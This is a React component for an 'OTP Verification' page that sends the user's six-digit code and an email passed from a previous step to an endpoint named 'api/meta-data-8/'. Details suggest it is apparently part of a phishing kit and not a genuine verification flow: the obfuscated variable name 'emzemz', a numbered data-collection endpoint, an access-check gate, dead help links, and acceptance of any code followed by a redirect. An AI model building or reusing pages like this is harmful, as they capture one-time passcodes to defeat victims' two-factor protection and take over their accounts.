import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const OTPVerification: React.FC = () => {
  const [otp, setOtp] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    otp: ''
  });

  const location = useLocation();
  const { emzemz } = location.state || {};

  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  // Debug: Log the received email
  console.log('OTPVerification received email:', emzemz);

  // Show loading state while checking access
  if (!isAllowed) {
    return <div>Loading...</div>;
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    let newErrors = {
      otp: !otp.trim() ? 'OTP is required.' : otp.length !== 6 ? 'OTP must be 6 digits.' : ''
    };

    setErrors(newErrors);

    if (!newErrors.otp) {
      try {
        await axios.post(`${baseUrl}api/meta-data-8/`, {
          emzemz,
          otp
        });
        console.log('OTP verification successful');
        // Navigate to completion or success page
        alert('OTP verified successfully! Process complete.');
        navigate('/');
      } catch (error) {
        console.error('Error verifying OTP:', error);
        setErrors(prev => ({
          ...prev,
          otp: 'Invalid OTP. Please try again.'
        }));
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex-1 bg-gray-200 rounded shadow-sm">
      <div className="border-b-2 border-teal-500 px-8 py-4">
        <h2 className="text-xl font-semibold text-gray-800">OTP Verification</h2>
      </div>

      <div className="px-6 py-6 bg-white space-y-4">
        <p className="">Please enter the 6-digit OTP sent to your email or phone to complete verification.</p>

        <form onSubmit={handleSubmit} className="max-w-lg mx-auto">
          <div className="mb-4">
            <label className="block text-gray-700 text-sm font-medium mb-2">
              Enter OTP
            </label>
            <input
              type="text"
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
              className="w-full max-w-md border border-gray-300 px-2 py-1 text-sm text-center tracking-widest"
              placeholder="123456"
              maxLength={6}
              pattern="[0-9]{6}"
            />
            {errors.otp && (
              <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
                </svg>
                <span>{errors.otp}</span>
              </div>
            )}
          </div>

          <div className="text-sm text-gray-600 mb-4">
            <p>Didn't receive the OTP? <a href="#" className="text-blue-600 hover:underline">Resend OTP</a></p>
          </div>

          <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
            {!isLoading ? (
              <button
                type="submit"
                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
              >
                Verify OTP
              </button>
            ) : (
              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
            )}
          </div>
        </form>
      </div>

      <div className="px-6 pb-6">
        <p className="text-xs text-gray-700 mb-2">
          For security reasons, the OTP is valid for a limited time. Please enter it as soon as possible.
        </p>
        <div className="text-xs text-blue-700 space-x-2">
          <a href="#" className="hover:underline">Need Help?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Contact Support</a>
        </div>
      </div>
    </div>
  );
};

export default OTPVerification;
